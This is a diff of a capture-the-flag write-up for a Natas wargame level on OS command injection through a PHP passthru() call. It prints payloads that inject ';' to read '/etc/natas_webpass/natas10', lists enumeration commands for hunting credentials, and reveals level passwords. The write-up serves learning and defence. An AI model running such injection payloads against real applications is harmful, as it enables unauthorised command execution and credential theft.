@@ -1,20 +1,39 @@
-#### Concept
-**OS Command Injection.**
-This vulnerability occurs when an application takes user input and embeds it into a system shell command without proper sanitization. By using shell metacharacters like `;`, `&&`, or `|`, an attacker can execute unintended commands with the same privileges as the web server.
-#### Key Commands
-- **`;` (Semicolon):** Allows running multiple commands in sequence.
-- **`ls`:** List directory contents (used for reconnaissance).
-- **`cat`:** Standard Unix utility to read and display file contents.
-#### Walkthrough / Resolution
-- **Reconnaissance:** Tested the injection by entering `; ls ;`. The server returned a list of files, confirming that shell commands could be executed.
-- **Information Gathering:** Used `; ls /etc/natas_webpass/` to verify the existence of the password files.
-- **Exploitation:** Injected a command to read the target file.
-- **Payload:** `; cat /etc/natas_webpass/natas10 ; ""`
-    - The first `;` terminates the empty `grep`.
-    - The `cat` command reads the password.
-    - The trailing `; ""` handles the leftover `dictionary.txt` string in the original PHP command to prevent execution errors.
-#### Key Takeaways / Lessons Learned
-- **Sanitization is priority:** Never pass raw user input to functions like `passthru()`, `system()`, or `exec()`.
-- **Principle of Least Privilege:** Web servers should not have read access to sensitive system files like `/etc/natas_webpass/`.
+#### Summary
+Unsanitized user input was passed directly to a shell command, allowing arbitrary command execution (**Command Injection**).
+#### Target
+The `needle` query parameter, which is concatenated into a command executed by `passthru()`.
+#### Exploit
+1. Inspect the source code.
+2. Identify the vulnerable line:
+```php
+    passthru("grep -i $key dictionary.txt");
+```
+3. Inject a shell command separator (`;`) followed by another command.
+4. Read the password file.
+#### Payloads / Commands
+```text
+; cat /etc/natas_webpass/natas10
+```
+The resulting command becomes:
+```bash
+grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
+```
+#### Why it works
+`passthru()` executes the constructed string through the system shell. Since user input is concatenated without validation or escaping, shell metacharacters such as `;` are interpreted as command separators, allowing arbitrary commands to be executed.
+#### Real-World Notes
+After confirming Command Injection, a real penetration test would typically continue with **enumeration** before targeting sensitive files.
+Common commands include:
+- `pwd` — Print the current working directory.
+- `ls -la` — List files, including hidden ones.
+- `whoami` — Display the current user.
+- `id` — Show user and group identifiers.
+- `env` — Display environment variables.
+- [[find]] — Search the filesystem for configuration files, credentials, backups, scripts, or other interesting targets.
+> Natas exposes the password location as part of the challenge (`/etc/natas_webpass/`). In a real-world scenario, discovering valuable files is usually part of the assessment.
+#### Takeaways
+- Never concatenate user input into shell commands.
+- Validate and sanitize all external input.
+- Prefer safe APIs that avoid invoking the shell whenever possible.
+- Command Injection often leads to Remote Code Execution (RCE).
 #### Pass 10
-t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
